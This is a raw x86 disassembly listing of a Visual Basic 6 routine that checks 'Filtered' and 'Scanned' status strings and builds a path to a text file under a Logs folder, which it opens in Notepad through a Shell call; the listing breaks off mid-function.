00749213: push var_00000330
00749219: push var_00000334
0074921F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00749224: mov var_00000388, eax
0074922A: jmp 749233h
0074922C: and var_00000388, 00000000h
00749233: push 004412BCh
00749238: push 00000000h
0074923A: push 00000007h
0074923C: mov eax, [ebp+08h]
0074923F: mov eax, [eax]
00749241: push [ebp+08h]
00749244: call [eax+0000032Ch]
0074924A: push eax
0074924B: lea eax, var_50
0074924E: push eax
0074924F: call 00410A84h ; Set (object)
00749254: push eax
00749255: lea eax, var_000000B4
0074925B: push eax
0074925C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749261: add esp, 00000010h
00749264: push eax
00749265: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074926A: push eax
0074926B: lea eax, var_54
0074926E: push eax
0074926F: call 00410A84h ; Set (object)
00749274: mov var_00000340, eax
0074927A: push 004412DCh
0074927F: push 00000000h
00749281: push 0000000Dh
00749283: mov eax, [ebp+08h]
00749286: mov eax, [eax]
00749288: push [ebp+08h]
0074928B: call [eax+0000032Ch]
00749291: push eax
00749292: lea eax, var_48
00749295: push eax
00749296: call 00410A84h ; Set (object)
0074929B: push eax
0074929C: lea eax, var_000000A4
007492A2: push eax
007492A3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007492A8: add esp, 00000010h
007492AB: push eax
007492AC: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007492B1: push eax
007492B2: lea eax, var_4C
007492B5: push eax
007492B6: call 00410A84h ; Set (object)
007492BB: mov var_00000338, eax
007492C1: lea eax, var_0000030C
007492C7: push eax
007492C8: mov eax, var_00000338
007492CE: mov eax, [eax]
007492D0: push var_00000338
007492D6: call [eax+44h]
007492D9: fclex 
007492DB: mov var_0000033C, eax
007492E1: cmp var_0000033C, 00000000h
007492E8: jnl 74930Ah
007492EA: push 00000044h
007492EC: push 004412DCh
007492F1: push var_00000338
007492F7: push var_0000033C
007492FD: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00749302: mov var_0000038C, eax
00749308: jmp 749311h
0074930A: and var_0000038C, 00000000h
00749311: mov eax, var_0000030C
00749317: mov var_000000BC, eax
0074931D: mov var_000000C4, 00000003h
00749327: lea eax, var_58
0074932A: push eax
0074932B: lea eax, var_000000C4
00749331: push eax
00749332: mov eax, var_00000340
00749338: mov eax, [eax]
0074933A: push var_00000340
00749340: call [eax+24h]
00749343: fclex 
00749345: mov var_00000344, eax
0074934B: cmp var_00000344, 00000000h
00749352: jnl 749374h
00749354: push 00000024h
00749356: push 004412BCh
0074935B: push var_00000340
00749361: push var_00000344
00749367: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074936C: mov var_00000390, eax
00749372: jmp 74937Bh
00749374: and var_00000390, 00000000h
0074937B: mov eax, var_58
0074937E: mov var_00000348, eax
00749384: lea eax, var_28
00749387: push eax
00749388: push 00000006h
0074938A: mov eax, var_00000348
00749390: mov eax, [eax]
00749392: push var_00000348
00749398: call [eax+00000084h]
0074939E: fclex 
007493A0: mov var_0000034C, eax
007493A6: cmp var_0000034C, 00000000h
007493AD: jnl 7493D2h
007493AF: push 00000084h
007493B4: push 004412DCh
007493B9: push var_00000348
007493BF: push var_0000034C
007493C5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007493CA: mov var_00000394, eax
007493D0: jmp 7493D9h
007493D2: and var_00000394, 00000000h
007493D9: push var_24
007493DC: push 0044A524h ; Filtered
007493E1: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
007493E6: mov esi, eax
007493E8: neg esi
007493EA: sbb esi, esi
007493EC: inc esi
007493ED: neg esi
007493EF: push var_28
007493F2: push 0044A364h ; Scanned
007493F7: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
007493FC: neg eax
007493FE: sbb eax, eax
00749400: inc eax
00749401: neg eax
00749403: or si, ax
00749406: mov var_00000350, si
0074940D: lea eax, var_28
00749410: push eax
00749411: lea eax, var_24
00749414: push eax
00749415: push 00000002h
00749417: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074941C: add esp, 0000000Ch
0074941F: lea eax, var_58
00749422: push eax
00749423: lea eax, var_54
00749426: push eax
00749427: lea eax, var_50
0074942A: push eax
0074942B: lea eax, var_4C
0074942E: push eax
0074942F: lea eax, var_48
00749432: push eax
00749433: lea eax, var_44
00749436: push eax
00749437: lea eax, var_40
0074943A: push eax
0074943B: lea eax, var_3C
0074943E: push eax
0074943F: lea eax, var_38
00749442: push eax
00749443: lea eax, var_34
00749446: push eax
00749447: push 0000000Ah
00749449: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074944E: add esp, 0000002Ch
00749451: lea eax, var_000000C4
00749457: push eax
00749458: lea eax, var_000000B4
0074945E: push eax
0074945F: lea eax, var_000000A4
00749465: push eax
00749466: lea eax, var_00000094
0074946C: push eax
0074946D: lea eax, var_00000084
00749473: push eax
00749474: lea eax, var_74
00749477: push eax
00749478: push 00000006h
0074947A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074947F: add esp, 0000001Ch
00749482: movsx eax, word ptr var_00000350
00749489: test eax, eax
0074948B: jz 00749D20h
00749491: mov var_04, 00000005h
00749498: push 00000020h
0074949A: lea eax, var_74
0074949D: push eax
0074949E: call 004108CEh ; arg_1 = arg_3 & Chr(arg_2)
007494A3: cmp [008F529Ch], 00000000h
007494AA: jnz 7494C7h
007494AC: push 008F529Ch
007494B1: push 00440F2Ch
007494B6: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007494BB: mov var_00000398, 008F529Ch
007494C5: jmp 7494D1h
007494C7: mov var_00000398, 008F529Ch
007494D1: mov eax, var_00000398
007494D7: mov eax, [eax]
007494D9: mov var_00000320, eax
007494DF: lea eax, var_34
007494E2: push eax
007494E3: mov eax, var_00000320
007494E9: mov eax, [eax]
007494EB: push var_00000320
007494F1: call [eax+14h]
007494F4: fclex 
007494F6: mov var_00000324, eax
007494FC: cmp var_00000324, 00000000h
00749503: jnl 749525h
00749505: push 00000014h
00749507: push 00440F1Ch
0074950C: push var_00000320
00749512: push var_00000324
00749518: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074951D: mov var_0000039C, eax
00749523: jmp 74952Ch
00749525: and var_0000039C, 00000000h
0074952C: mov eax, var_34
0074952F: mov var_00000328, eax
00749535: lea eax, var_24
00749538: push eax
00749539: mov eax, var_00000328
0074953F: mov eax, [eax]
00749541: push var_00000328
00749547: call [eax+50h]
0074954A: fclex 
0074954C: mov var_0000032C, eax
00749552: cmp var_0000032C, 00000000h
00749559: jnl 74957Bh
0074955B: push 00000050h
0074955D: push 00440F3Ch
00749562: push var_00000328
00749568: push var_0000032C
0074956E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00749573: mov var_000003A0, eax
00749579: jmp 749582h
0074957B: and var_000003A0, 00000000h
00749582: mov var_0000027C, 00000007h
0074958C: mov var_00000284, 00000003h
00749596: cmp [008F2770h], 00000000h
0074959D: jnz 7495BAh
0074959F: push 008F2770h
007495A4: push 0041CD38h
007495A9: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007495AE: mov var_000003A4, 008F2770h
007495B8: jmp 7495C4h
007495BA: mov var_000003A4, 008F2770h
007495C4: push 004412DCh
007495C9: push 00000000h
007495CB: push 0000000Dh
007495CD: mov eax, var_000003A4
007495D3: mov eax, [eax]
007495D5: mov ecx, var_000003A4
007495DB: mov ecx, [ecx]
007495DD: mov ecx, [ecx]
007495DF: push eax
007495E0: call [ecx+0000032Ch]
007495E6: push eax
007495E7: lea eax, var_38
007495EA: push eax
007495EB: call 00410A84h ; Set (object)
007495F0: push eax
007495F1: lea eax, var_000000E4
007495F7: push eax
007495F8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007495FD: add esp, 00000010h
00749600: push eax
00749601: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00749606: push eax
00749607: lea eax, var_3C
0074960A: push eax
0074960B: call 00410A84h ; Set (object)
00749610: mov var_00000330, eax
00749616: lea eax, var_28
00749619: push eax
0074961A: mov eax, var_00000330
00749620: mov eax, [eax]
00749622: push var_00000330
00749628: call [eax+4Ch]
0074962B: fclex 
0074962D: mov var_00000334, eax
00749633: cmp var_00000334, 00000000h
0074963A: jnl 74965Ch
0074963C: push 0000004Ch
0074963E: push 004412DCh
00749643: push var_00000330
00749649: push var_00000334
0074964F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00749654: mov var_000003A8, eax
0074965A: jmp 749663h
0074965C: and var_000003A8, 00000000h
00749663: mov eax, var_28
00749666: mov var_00000368, eax
0074966C: and var_28, 00000000h
00749670: mov eax, var_00000368
00749676: mov var_000000FC, eax
0074967C: mov var_00000104, 00000008h
00749686: cmp [008F2010h], 00000000h
0074968D: jnz 7496AAh
0074968F: push 008F2010h
00749694: push 00433984h
00749699: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074969E: mov var_000003AC, 008F2010h
007496A8: jmp 7496B4h
007496AA: mov var_000003AC, 008F2010h
007496B4: push 00000010h
007496B6: pop eax
007496B7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007496BC: lea esi, var_00000284
007496C2: mov edi, esp
007496C4: movsd 
007496C5: movsd 
007496C6: movsd 
007496C7: movsd 
007496C8: push 00000001h
007496CA: push 00000010h
007496CC: push 00440E58h
007496D1: push 00000010h
007496D3: pop eax
007496D4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007496D9: lea esi, var_00000104
007496DF: mov edi, esp
007496E1: movsd 
007496E2: movsd 
007496E3: movsd 
007496E4: movsd 
007496E5: push 00000001h
007496E7: push 00000000h
007496E9: push 00440E48h
007496EE: push 00000000h
007496F0: push 00000018h
007496F2: mov eax, var_000003AC
007496F8: mov eax, [eax]
007496FA: mov ecx, var_000003AC
00749700: mov ecx, [ecx]
00749702: mov ecx, [ecx]
00749704: push eax
00749705: call [ecx+00000550h]
0074970B: push eax
0074970C: lea eax, var_40
0074970F: push eax
00749710: call 00410A84h ; Set (object)
00749715: push eax
00749716: lea eax, var_000000F4
0074971C: push eax
0074971D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749722: add esp, 00000010h
00749725: push eax
00749726: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074972B: push eax
0074972C: lea eax, var_44
0074972F: push eax
00749730: call 00410A84h ; Set (object)
00749735: push eax
00749736: lea eax, var_00000114
0074973C: push eax
0074973D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749742: add esp, 00000020h
00749745: push eax
00749746: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074974B: push eax
0074974C: lea eax, var_48
0074974F: push eax
00749750: call 00410A84h ; Set (object)
00749755: push eax
00749756: lea eax, var_00000124
0074975C: push eax
0074975D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749762: add esp, 00000020h
00749765: mov var_000002BC, 00000006h
0074976F: mov var_000002C4, 00000003h
00749779: cmp [008F2770h], 00000000h
00749780: jnz 74979Dh
00749782: push 008F2770h
00749787: push 0041CD38h
0074978C: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00749791: mov var_000003B0, 008F2770h
0074979B: jmp 7497A7h
0074979D: mov var_000003B0, 008F2770h
007497A7: push 004412DCh
007497AC: push 00000000h
007497AE: push 0000000Dh
007497B0: mov eax, var_000003B0
007497B6: mov eax, [eax]
007497B8: mov ecx, var_000003B0
007497BE: mov ecx, [ecx]
007497C0: mov ecx, [ecx]
007497C2: push eax
007497C3: call [ecx+0000032Ch]
007497C9: push eax
007497CA: lea eax, var_4C
007497CD: push eax
007497CE: call 00410A84h ; Set (object)
007497D3: push eax
007497D4: lea eax, var_00000164
007497DA: push eax
007497DB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007497E0: add esp, 00000010h
007497E3: push eax
007497E4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007497E9: push eax
007497EA: lea eax, var_50
007497ED: push eax
007497EE: call 00410A84h ; Set (object)
007497F3: mov var_00000338, eax
007497F9: lea eax, var_2C
007497FC: push eax
007497FD: mov eax, var_00000338
00749803: mov eax, [eax]
00749805: push var_00000338
0074980B: call [eax+4Ch]
0074980E: fclex 
00749810: mov var_0000033C, eax
00749816: cmp var_0000033C, 00000000h
0074981D: jnl 74983Fh
0074981F: push 0000004Ch
00749821: push 004412DCh
00749826: push var_00000338
0074982C: push var_0000033C
00749832: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00749837: mov var_000003B4, eax
0074983D: jmp 749846h
0074983F: and var_000003B4, 00000000h
00749846: mov eax, var_2C
00749849: mov var_0000036C, eax
0074984F: and var_2C, 00000000h
00749853: mov eax, var_0000036C
00749859: mov var_0000017C, eax
0074985F: mov var_00000184, 00000008h
00749869: cmp [008F2010h], 00000000h
00749870: jnz 74988Dh
00749872: push 008F2010h
00749877: push 00433984h
0074987C: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00749881: mov var_000003B8, 008F2010h
0074988B: jmp 749897h
0074988D: mov var_000003B8, 008F2010h
00749897: push 00000010h
00749899: pop eax
0074989A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074989F: lea esi, var_000002C4
007498A5: mov edi, esp
007498A7: movsd 
007498A8: movsd 
007498A9: movsd 
007498AA: movsd 
007498AB: push 00000001h
007498AD: push 00000010h
007498AF: push 00440E58h
007498B4: push 00000010h
007498B6: pop eax
007498B7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007498BC: lea esi, var_00000184
007498C2: mov edi, esp
007498C4: movsd 
007498C5: movsd 
007498C6: movsd 
007498C7: movsd 
007498C8: push 00000001h
007498CA: push 00000000h
007498CC: push 00440E48h
007498D1: push 00000000h
007498D3: push 00000018h
007498D5: mov eax, var_000003B8
007498DB: mov eax, [eax]
007498DD: mov ecx, var_000003B8
007498E3: mov ecx, [ecx]
007498E5: mov ecx, [ecx]
007498E7: push eax
007498E8: call [ecx+00000550h]
007498EE: push eax
007498EF: lea eax, var_54
007498F2: push eax
007498F3: call 00410A84h ; Set (object)
007498F8: push eax
007498F9: lea eax, var_00000174
007498FF: push eax
00749900: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749905: add esp, 00000010h
00749908: push eax
00749909: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074990E: push eax
0074990F: lea eax, var_58
00749912: push eax
00749913: call 00410A84h ; Set (object)
00749918: push eax
00749919: lea eax, var_00000194
0074991F: push eax
00749920: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749925: add esp, 00000020h
00749928: push eax
00749929: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074992E: push eax
0074992F: lea eax, var_5C
00749932: push eax
00749933: call 00410A84h ; Set (object)
00749938: push eax
00749939: lea eax, var_000001A4
0074993F: push eax
00749940: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749945: add esp, 00000020h
00749948: push 004412DCh
0074994D: push 00000000h
0074994F: push 0000000Dh
00749951: mov eax, [ebp+08h]
00749954: mov eax, [eax]
00749956: push [ebp+08h]
00749959: call [eax+0000032Ch]
0074995F: push eax
00749960: lea eax, var_60
00749963: push eax
00749964: call 00410A84h ; Set (object)
00749969: push eax
0074996A: lea eax, var_000001E4
00749970: push eax
00749971: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749976: add esp, 00000010h
00749979: push eax
0074997A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074997F: push eax
00749980: lea eax, var_64
00749983: push eax
00749984: call 00410A84h ; Set (object)
00749989: mov var_00000340, eax
0074998F: lea eax, var_30
00749992: push eax
00749993: mov eax, var_00000340
00749999: mov eax, [eax]
0074999B: push var_00000340
007499A1: call [eax+4Ch]
007499A4: fclex 
007499A6: mov var_00000344, eax
007499AC: cmp var_00000344, 00000000h
007499B3: jnl 7499D5h
007499B5: push 0000004Ch
007499B7: push 004412DCh
007499BC: push var_00000340
007499C2: push var_00000344
007499C8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007499CD: mov var_000003BC, eax
007499D3: jmp 7499DCh
007499D5: and var_000003BC, 00000000h
007499DC: push var_30
007499DF: call 004109DCh ; Val(arg_1)
007499E4: fstp real8 ptr var_0000031C
007499EA: push 00000020h
007499EC: lea eax, var_00000214
007499F2: push eax
007499F3: call 004108CEh ; arg_1 = arg_3 & Chr(arg_2)
007499F8: mov var_0000022C, 0044BA20h ; notepad
00749A02: mov var_00000234, 00000008h
00749A0C: mov eax, var_24
00749A0F: mov var_00000370, eax
00749A15: and var_24, 00000000h
00749A19: mov eax, var_00000370
00749A1F: mov var_0000008C, eax
00749A25: mov var_00000094, 00000008h
00749A2F: mov var_0000023C, 0044A818h ; \Logs\
00749A39: mov var_00000244, 00000008h
00749A43: mov eax, [8F23B4h]
00749A48: mov var_0000024C, eax
00749A4E: mov var_00000254, 00000008h
00749A58: mov var_0000025C, 00441B28h
00749A62: mov var_00000264, 00000008h
00749A6C: lea eax, var_00000124
00749A72: push eax
00749A73: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00749A78: mov var_0000012C, eax
00749A7E: mov var_00000134, 00000008h
00749A88: mov var_0000029C, 004495B0h
00749A92: mov var_000002A4, 00000008h
00749A9C: lea eax, var_000001A4
00749AA2: push eax
00749AA3: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00749AA8: mov var_000001AC, eax
00749AAE: mov var_000001B4, 00000008h
00749AB8: mov var_000002DC, 0044A82Ch
00749AC2: mov var_000002E4, 00000008h
00749ACC: fld real8 ptr var_0000031C
00749AD2: call 00410814h ; msvbvm60.dll.__vbaFpI4
00749AD7: push eax
00749AD8: push [008F2074h]
00749ADE: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00749AE3: mov eax, [eax]
00749AE5: mov var_000002EC, eax
00749AEB: mov var_000002F4, 00000008h
00749AF5: mov var_000002FC, 0044A834h ; .txt
00749AFF: mov var_00000304, 00000008h
00749B09: push 00000001h
00749B0B: lea eax, var_00000234
00749B11: push eax
00749B12: lea eax, var_74
00749B15: push eax
00749B16: lea eax, var_00000084
00749B1C: push eax
00749B1D: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00749B22: push eax
00749B23: lea eax, var_00000094
00749B29: push eax
00749B2A: lea eax, var_000000A4
00749B30: push eax
00749B31: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00749B36: push eax
00749B37: lea eax, var_00000244
00749B3D: push eax
00749B3E: lea eax, var_000000B4
00749B44: push eax
00749B45: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00749B4A: push eax
00749B4B: lea eax, var_00000254
00749B51: push eax
00749B52: lea eax, var_000000C4
00749B58: push eax
00749B59: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00749B5E: push eax
00749B5F: lea eax, var_00000264
00749B65: push eax
00749B66: lea eax, var_000000D4
00749B6C: push eax
00749B6D: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00749B72: push eax
00749B73: lea eax, var_00000134
00749B79: push eax
00749B7A: lea eax, var_00000144
00749B80: push eax
00749B81: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00749B86: push eax
00749B87: lea eax, var_000002A4
00749B8D: push eax
00749B8E: lea eax, var_00000154
00749B94: push eax
00749B95: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00749B9A: push eax
00749B9B: lea eax, var_000001B4
00749BA1: push eax
00749BA2: lea eax, var_000001C4
00749BA8: push eax
00749BA9: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00749BAE: push eax
00749BAF: lea eax, var_000002E4
00749BB5: push eax
00749BB6: lea eax, var_000001D4
00749BBC: push eax
00749BBD: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00749BC2: push eax
00749BC3: lea eax, var_000002F4
00749BC9: push eax
00749BCA: lea eax, var_000001F4
00749BD0: push eax
00749BD1: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00749BD6: push eax
00749BD7: lea eax, var_00000304
00749BDD: push eax
00749BDE: lea eax, var_00000204
00749BE4: push eax
00749BE5: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00749BEA: push eax
00749BEB: lea eax, var_00000214
00749BF1: push eax
00749BF2: lea eax, var_00000224
00749BF8: push eax
00749BF9: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00749BFE: push eax
00749BFF: call 00410A96h ; Shell
00749C04: fstp real8 ptr var_00000314
00749C0A: lea ecx, var_30
00749C0D: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00749C12: lea eax, var_64
00749C15: push eax
00749C16: lea eax, var_60
00749C19: push eax
00749C1A: lea eax, var_5C
00749C1D: push eax
00749C1E: lea eax, var_58
00749C21: push eax
00749C22: lea eax, var_54
00749C25: push eax
00749C26: lea eax, var_50
00749C29: push eax
00749C2A: lea eax, var_4C
00749C2D: push eax
00749C2E: lea eax, var_48
00749C31: push eax
00749C32: lea eax, var_44
00749C35: push eax
00749C36: lea eax, var_40
00749C39: push eax
00749C3A: lea eax, var_3C
00749C3D: push eax
00749C3E: lea eax, var_38
00749C41: push eax
00749C42: lea eax, var_34
00749C45: push eax
00749C46: push 0000000Dh
00749C48: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00749C4D: add esp, 00000038h
00749C50: lea eax, var_00000224
00749C56: push eax
00749C57: lea eax, var_00000214
00749C5D: push eax
00749C5E: lea eax, var_00000204
00749C64: push eax
00749C65: lea eax, var_000001F4
00749C6B: push eax
00749C6C: lea eax, var_000001D4
00749C72: push eax
00749C73: lea eax, var_000001E4
00749C79: push eax
00749C7A: lea eax, var_000001C4
00749C80: push eax
00749C81: lea eax, var_000001B4
00749C87: push eax
00749C88: lea eax, var_00000154
00749C8E: push eax
00749C8F: lea eax, var_000001A4
00749C95: push eax
00749C96: lea eax, var_00000194
00749C9C: push eax
00749C9D: lea eax, var_00000184
00749CA3: push eax
00749CA4: lea eax, var_00000174
00749CAA: push eax
00749CAB: lea eax, var_00000164
00749CB1: push eax
00749CB2: lea eax, var_00000144
00749CB8: push eax
00749CB9: lea eax, var_00000134
00749CBF: push eax
00749CC0: lea eax, var_000000D4
00749CC6: push eax
00749CC7: lea eax, var_00000124
00749CCD: push eax
00749CCE: lea eax, var_00000114
00749CD4: push eax
00749CD5: lea eax, var_00000104
00749CDB: push eax
00749CDC: lea eax, var_000000F4
00749CE2: push eax
00749CE3: lea eax, var_000000E4
00749CE9: push eax
00749CEA: lea eax, var_000000C4
00749CF0: push eax
00749CF1: lea eax, var_000000B4
00749CF7: push eax
00749CF8: lea eax, var_000000A4
00749CFE: push eax
00749CFF: lea eax, var_00000094
00749D05: push eax
00749D06: lea eax, var_00000084
00749D0C: push eax
00749D0D: lea eax, var_74
00749D10: push eax
00749D11: push 0000001Ch
00749D13: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00749D18: add esp, 00000074h
00749D1B: jmp 0074A54Bh
00749D20: mov var_04, 00000007h
00749D27: push 00000020h
00749D29: lea eax, var_74
00749D2C: push eax
00749D2D: call 004108CEh ; arg_1 = arg_3 & Chr(arg_2)
00749D32: cmp [008F529Ch], 00000000h
00749D39: jnz 749D56h
00749D3B: push 008F529Ch
00749D40: push 00440F2Ch
00749D45: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00749D4A: mov var_000003C0, 008F529Ch
00749D54: jmp 749D60h
00749D56: mov var_000003C0, 008F529Ch
00749D60: mov eax, var_000003C0
00749D66: mov eax, [eax]
00749D68: mov var_00000320, eax
00749D6E: lea eax, var_34
00749D71: push eax
00749D72: mov eax, var_00000320
00749D78: mov eax, [eax]
00749D7A: push var_00000320
00749D80: call [eax+14h]
00749D83: fclex 
00749D85: mov var_00000324, eax
00749D8B: cmp var_00000324, 00000000h
00749D92: jnl 749DB4h
00749D94: push 00000014h
00749D96: push 00440F1Ch
00749D9B: push var_00000320
00749DA1: push var_00000324
00749DA7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00749DAC: mov var_000003C4, eax
00749DB2: jmp 749DBBh
00749DB4: and var_000003C4, 00000000h
00749DBB: mov eax, var_34
00749DBE: mov var_00000328, eax
00749DC4: lea eax, var_24
00749DC7: push eax
00749DC8: mov eax, var_00000328
00749DCE: mov eax, [eax]
00749DD0: push var_00000328
00749DD6: call [eax+50h]
00749DD9: fclex 
00749DDB: mov var_0000032C, eax
00749DE1: cmp var_0000032C, 00000000h
00749DE8: jnl 749E0Ah
00749DEA: push 00000050h
00749DEC: push 00440F3Ch
00749DF1: push var_00000328
00749DF7: push var_0000032C
00749DFD: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00749E02: mov var_000003C8, eax
00749E08: jmp 749E11h
00749E0A: and var_000003C8, 00000000h
00749E11: mov var_0000025C, 00000007h
00749E1B: mov var_00000264, 00000003h
00749E25: cmp [008F2770h], 00000000h
00749E2C: jnz 749E49h
00749E2E: push 008F2770h
00749E33: push 0041CD38h
00749E38: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00749E3D: mov var_000003CC, 008F2770h
00749E47: jmp 749E53h
00749E49: mov var_000003CC, 008F2770h
00749E53: push 004412DCh
00749E58: push 00000000h
00749E5A: push 0000000Dh
00749E5C: mov eax, var_000003CC
00749E62: mov eax, [eax]
00749E64: mov ecx, var_000003CC
00749E6A: mov ecx, [ecx]
00749E6C: mov ecx, [ecx]
00749E6E: push eax
00749E6F: call [ecx+0000032Ch]
00749E75: push eax
00749E76: lea eax, var_38
00749E79: push eax
00749E7A: call 00410A84h ; Set (object)
00749E7F: push eax
00749E80: lea eax, var_000000C4
00749E86: push eax
00749E87: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749E8C: add esp, 00000010h
00749E8F: push eax
00749E90: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00749E95: push eax
00749E96: lea eax, var_3C
00749E99: push eax
00749E9A: call 00410A84h ; Set (object)
00749E9F: mov var_00000330, eax
00749EA5: lea eax, var_28
00749EA8: push eax
00749EA9: mov eax, var_00000330
00749EAF: mov eax, [eax]
00749EB1: push var_00000330
00749EB7: call [eax+4Ch]
00749EBA: fclex 
00749EBC: mov var_00000334, eax
00749EC2: cmp var_00000334, 00000000h
00749EC9: jnl 749EEBh
00749ECB: push 0000004Ch
00749ECD: push 004412DCh
00749ED2: push var_00000330
00749ED8: push var_00000334
00749EDE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00749EE3: mov var_000003D0, eax
00749EE9: jmp 749EF2h
00749EEB: and var_000003D0, 00000000h
00749EF2: mov eax, var_28
00749EF5: mov var_00000374, eax
00749EFB: and var_28, 00000000h
00749EFF: mov eax, var_00000374
00749F05: mov var_000000DC, eax
00749F0B: mov var_000000E4, 00000008h
00749F15: cmp [008F2010h], 00000000h
00749F1C: jnz 749F39h
00749F1E: push 008F2010h
00749F23: push 00433984h
00749F28: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00749F2D: mov var_000003D4, 008F2010h
00749F37: jmp 749F43h
00749F39: mov var_000003D4, 008F2010h
00749F43: push 00000010h
00749F45: pop eax
00749F46: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00749F4B: lea esi, var_00000264
00749F51: mov edi, esp
00749F53: movsd 
00749F54: movsd 
00749F55: movsd 
00749F56: movsd 
00749F57: push 00000001h
00749F59: push 00000010h
00749F5B: push 00440E58h
00749F60: push 00000010h
00749F62: pop eax
00749F63: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00749F68: lea esi, var_000000E4
00749F6E: mov edi, esp
00749F70: movsd 
00749F71: movsd 
00749F72: movsd 
00749F73: movsd 
00749F74: push 00000001h
00749F76: push 00000000h
00749F78: push 00440E48h
00749F7D: push 00000000h
00749F7F: push 00000018h
00749F81: mov eax, var_000003D4
00749F87: mov eax, [eax]
00749F89: mov ecx, var_000003D4
00749F8F: mov ecx, [ecx]
00749F91: mov ecx, [ecx]
00749F93: push eax
00749F94: call [ecx+00000550h]
00749F9A: push eax
00749F9B: lea eax, var_40
00749F9E: push eax
00749F9F: call 00410A84h ; Set (object)
00749FA4: push eax
00749FA5: lea eax, var_000000D4
00749FAB: push eax
00749FAC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749FB1: add esp, 00000010h
00749FB4: push eax
00749FB5: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00749FBA: push eax
00749FBB: lea eax, var_44
00749FBE: push eax
00749FBF: call 00410A84h ; Set (object)
00749FC4: push eax
00749FC5: lea eax, var_000000F4
00749FCB: push eax
00749FCC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749FD1: add esp, 00000020h
00749FD4: push eax
00749FD5: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00749FDA: push eax
00749FDB: lea eax, var_48
00749FDE: push eax
00749FDF: call 00410A84h ; Set (object)
00749FE4: push eax
00749FE5: lea eax, var_00000104
00749FEB: push eax
00749FEC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749FF1: add esp, 00000020h
00749FF4: mov var_0000029C, 00000006h
00749FFE: mov var_000002A4, 00000003h
0074A008: cmp [008F2770h], 00000000h
0074A00F: jnz 74A02Ch
0074A011: push 008F2770h
0074A016: push 0041CD38h
0074A01B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074A020: mov var_000003D8, 008F2770h
0074A02A: jmp 74A036h
0074A02C: mov var_000003D8, 008F2770h
0074A036: push 004412DCh
0074A03B: push 00000000h
0074A03D: push 0000000Dh
